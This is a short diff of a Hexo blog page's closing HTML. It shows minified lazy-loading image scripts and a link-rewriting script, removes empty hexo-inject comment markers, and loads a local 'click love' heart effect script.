-<script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
